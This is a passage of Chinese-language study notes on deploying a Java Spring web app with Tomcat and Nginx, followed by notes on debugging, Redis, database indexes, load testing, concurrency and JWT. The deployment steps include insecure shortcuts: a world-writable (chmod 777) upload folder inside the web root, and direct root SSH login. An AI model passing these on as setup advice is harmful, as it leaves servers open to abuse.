    * [服务器端] 重启 Nginx 使配置生效
    `sudo service nginx restart`

  12. 配置图片上传路径
    * 在服务器上对应路径建立文件夹
    ```
    cd /var/lib/tomcat9/webapps
    mkdir images
    // 路径由项目的FileUploadController.java决定
    ```
    * 修改图片文件夹的访问权限 `chmod 777 images`
    * 访问 http://网站/upload/index 上传一张名字为 1.png 的图片 上传成功后, 刷新网页, 就能显示该图片

# 调试
  1. 本机debug
    * 看 log 输出，有没有报错，错误可能在输出中间。
    * 浏览器按 f12 看前端有没有报错。
  2. 服务器debug
    * 用 Tomcat 启动程序
    * 测试是否能在服务器本地访问 `curl localhost:8080/todo`
  3. 检查 Tomcat
    * 看 Tomcat 状态：`systemctl status tomcat9`
    * 看日志1：`journalctl -e -u tomcat9` [-e 跳到最后面，-u 指定看哪个日志]
    * 看日志2: 在 /var/log/tomcat 下查看日志文件
    * [如果解决了BUG]把 war 包拷贝到 /var/lib/tomcat9/webapps/下, 改名为 ROOT.war
    * 命令行测试能否在服务器本地访问 `curl localhost:8080/todo`
    * 浏览器测试是否能在本机访问 `xx.xx.xxx.xx`。
  4. 检查 Nginx
    * 看 Nginx 状态：`systemctl status nginx`。
    * 看日志：`journalctl -e -u nginx` 或者在 /var/log/nginx 下查看日志文件
    * 看配置：`/etc/nginx/sites-enabled/xxx`
    * 在命令行用 `curl http://127.0.0.1` 来测试是否能在服务器本地访问。
    * 用浏览器来测试是否能在本机访问 `x.x.x.x`。
    * 在浏览器里按 f12 看前端有没有报错。
    * 检查腾讯云的安全组
  5. 如果解决掉一个 bug 后还是有其他 bug，重复上面步骤。

# 更新代码
  1. Tomcat 部署更新
      * 本地编译 war 包 [build/libs/ssm-0.0.1-SNAPSHOT.war]
      * 用 scp 或者 filezilla 把生成的 .war 包拷贝到服务器上去
      * scp 方式 `cd 项目目录` 然后`scp build/libs/ssm-0.0.1-SNAPSHOT.war root@xx.xx.xxx.xx:/var/lib/tomcat9/webapps/ROOT.war`[如果是上传到服务器的tmp目录 则需要拷贝到webapps目录 且保证包名为ROOT.war才可让Tomcat自动读取]
      * 拷贝完成后，tomcat9 会自动安装我们的程序，大概需要十几秒
      这时候就可以用下面的链接访问我们的网站了（注意打开防火墙）
      http://网站:8080/todo

  2. Nginx 配置更新
      * 把项目根目录下的 ssm.nginx 文件上传到服务器
      * 写入 Nginx 配置
        * 把本机的 ssm.nginx 文件上传到服务器的 /tmp/ssm.nginx
        * 把配置文件放入 nginx 的配置中 `sudo cp /tmp/ssm.nginx /etc/nginx/sites-enabled/ssm.nginx`
        * 注意删除 /etc/nginx/sites-enabled 目录下其他的配置文件, 否则会有 80 端口冲突
      * 重启 Nginx 使配置生效 `sudo service nginx restart`

      这时候，就可以使用下面的链接访问我们的网站了
      http://网站/todo

# 端口占用
  * 非 80 端口
      1. 按程序名找 PID `ps aux | grep java`(按端口号找 PID `lsof -i:9000`) + `kill PID` + 再次检查
      3. 如程序又被启动且换新 PID 说明是 systemd 守护的服务
      4. 找到进程id对应的服务 `systemctl status PID`
      5. 关掉这个服务 `systemctl stop 服务名`
  * 80 端口 除了考虑上述非 80 端口情况外，还需关闭 Nginx

# 索引
#### 哈希索引(适用于等值查询, 不支持范围查询和模糊查询  等)
#### B+树索引
  * ![](assets/markdown-img-paste-20200905111814177.png)
  * 主键索引(比如以id为索引 且id为主键)
    * 树节点存储多条间断的id
    * **叶子节点存储数据**[聚簇索引]
    * 树结点之间存在id范围关系
    * 叶子节点之间形成链表结构
  * 二级索引(比如以username为索引)
    * 树节点存储多条间断的username
    * **叶子节点不存储数据只存储主键的值(id)**[非聚簇索引]
    * 树结点之间存在username范围关系
    * 叶子节点之间形成链表结构
  * 覆盖索引, sql 要返回的值刚好是我索引的 key
  * 非覆盖索引, 需要多找一次主键索引, 这叫回表
  * 联合索引
  ![](assets/markdown-img-paste-20200905123516490.png)
  * 唯一索引 [可防止插入重复数据]
  * 联合唯一索引
  * 全文索引

# 其他
  * Servlet接口的实现由ServletInitializer.java完成
  * 程序入口: classes->kybmig->ssm->ServletInitializer.class, Tomcat扫到并启动该class后, 该class会去启动Spring, 然后Spring开始扫描代码, 进行依赖注入、实例化等工作.
  * Nginx 这种 http 服务器主要处理的就是转发请求, 返回响应, 以及返回静态资源
  * 负载均衡
  * 分库分表
  * 重装linux后要做的事
    1. `rm ~/.ssh/known_hosts`
    2. `cat ~/.ssh/id_rsa.pub` 在本地复制公钥
    2. `ssh ubuntu@xx.xx.xxx.xx`
    3. `sudo su`
    5. `cd ~/.ssh`
    6. `nano authorized_keys` 粘贴公钥到Linux
    7. 重启`service ssh restart`(也可能是service sshd restart)
    8. `ssh root@xx.xx.xxx.xx`
    9. 配置防火墙
  * 运行在80端口的网站必须备案
  * 顺序IO 从硬盘读取连续的一段数据到内存
  * 随机IO 由于数据不是连续存储 需要多次从硬盘中读取多段数据到内存 每段数据只会用到一小部分
#

-------------------------------------第26课笔记----------------------------------
# Redis
#### 缓存的简易实现
  * TopicController
    * 添加属性**cache**
    ```
    private HashMap<Integer, TopicModel> cache;
    ```
    * **/topic/detail/{id}** 如果cache存在此id 直接从cache中获取对应的topicModel 否则从数据库获取topicModel同时将id和topicModel的映射存入cache
    ```
    @GetMapping("/topic/detail/{id}")
    public ModelAndView detail(@PathVariable Integer id) {
        TopicModel topicModel;
        if (cache.containsKey(id)) {
            topicModel = cache.get(id);
        } else {
            topicModel = topicService.findByIdWithCommentsAndUser(id);

        }
        cache.put(id, topicModel);
        ...
    }
    ```
    * /topic/update 更新topicModel到数据库之后一并更新cache

#### Redis的特点
  * 本质上是一个独立运行的HashMap
  * 数据放在内存 处理效率高  
  * 作用一 缓存
  * 作用二 多进程数据共享（session）  
  * "事务"  序列化执行
  * 不支持回滚
  * 无密码 禁止远程连接

#### Mac本地Redis配置
  * 安装 `brew install redis`
  * 启动 `redis-server` (退出 `control + C`)
  * 新建一个Terminal 进入 `redis-cli`

#### 服务器Redis配置
  * 安装 `apt install redis-server`
  * 确认 `service redis status`
  * 进入 `redis-cli`
  * Redis命令链接: redis.com.cn
  * String使用示例
    * 切换到0数据库 `select 0`
    * `set s1 "gua"`
    * `get s1`
    * 清空数据库 `FLUSHALL`
  * HashMap使用示例
    * 切换到0数据库 `select 0`
    * `HMSET map1 k1 "v1"`
    * `HGETALL map1`
    * `HGET map1 k1`
  * Sets使用示例
    * 切换到0数据库 `select 0`
    * `SADD set1 1`
    * `SADD set1 2`
    * `SMEMBERS set1`
  * Sorted Sets使用示例
    * 切换到0数据库 `select 0`
    * `ZADD oset1 777 "bai"`
    * `ZADD oset1 888 "gua"`
    * `ZADD oset1 999 "eee"`
    * `ZRANGE oset1 1 3` 左开右闭 取第二和第三个元素

#### Java项目内的Redis配置和使用
  * build.gradle `implementation 'org.springframework.boot:spring-boot-starter-data-redis'`
  * Mac本地启动 `redis-server`
  * application.properties
  ```
  # Redis 默认设置，即不设置也是这些设置
  # Redis 不带密码, 因此6379端口禁止对外开放
  spring.redis.database=0
  spring.redis.host=localhost
  spring.redis.port=6379
  ```
  * RedisConfig 自定义配置
  * RedisController 使用示例

# 消息队列
  * ![](assets/markdown-img-paste-2020091211514917.png)
  * 正确性和可靠性
  * 重试 retry
  * 保证投递 guaranteed delivery
  * 消息队列的作用
      * 异步
      * 削峰
      * 解耦和分布式中的应用
  * 主流实现 rabbitmq, rocketmq, Apache kafka

# Redis的订阅功能
  * RedisConfig.container() 创建频道 (频道名messageQueue)
  * service/RedisSubscriber 订阅频道需要实现的类
  * RedisController.set() 推送消息
  ```
  templateNormal.convertAndSend(mailTopic.getTopic(), value);
  ```

# 性能测试
  * 登录服务器测试`ssh root@xx.xx.xxx.xx`或Mac本地测试
  * `apt install apache2-utils`
  * `curl http://localhost` 确认本地可正常访问
  * `ab -n 100 -c 20 http://localhost/`或`ab -n 100 -c 20 http://122.51.44.243/` 一共100个请求 每次发送20个请求
  * 核心指标
    * **RPS 每秒处理请求数** (或者QPS Query Per Second)
    ```
    Requests per second:    302.19 [#/sec] (mean)
    ```
    * **95%的请求在xx毫秒内处理**
    ```
    Percentage of the requests served within a certain time (ms)
      50%     57
      66%     69
      75%     79
      80%     83
      90%    109
      95%    115
      98%    118
      99%    120
      100%    120 (longest request)
    ```

# guaMVC多线程
  * server.java 建立线程池
  ```
  static ExecutorService pool = Executors.newCachedThreadPool();
  ```
  * 创建实现了Runnable接口的类GuaServlet
  * 在run()中使用GuaServlet
  ```
  GuaServlet servlet = new GuaServlet(socket, r);
  Thread t = new Thread(servlet);
  pool.execute(t);
  ```

# 并发
  * 特点
    * **可见性** 一个线程修改了数据 另一个线程能看得到 (Java保证可见性的关键字 volatile 编译器在用到用该关键字修饰的变量时必须每次都小心地重新读取这个变量的值，而不是使用保存在寄存器里的备份)
    * **原子性** 一组操作要么都执行 要么都不执行
    * **有序性**
  * ThreadExample
  * 悲观锁和乐观锁
  * ABA问题
  * 锁升级
    1. 无锁 乐观锁
    2. 偏向锁 减少了拿锁释放锁的次数
    3. 轻量级锁
    4. 重量级锁

# JWT
  * JWTDemo
  * 结构 `Header.Claims.Signature`  头部.载荷.签名
  * 示例 `eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJ1c2VybmFtZSI6Imd1YSJ9.REbW19p8qQomBm3rqqNXf428OuQq_JxmLp2bZAsLnrY`
  * base64解码
    * 头部 `{"typ":"JWT","alg":"HS256"}`
    * 载荷 `{"username":"gua"}`
  * 缺点
    * 登录失效的功能实现麻烦
    * 任何获得Token的人都能登录

# 其他
  * VisualVM
  * 数据库中表的关系
    * 一对多
    * 多对多 设置关联表
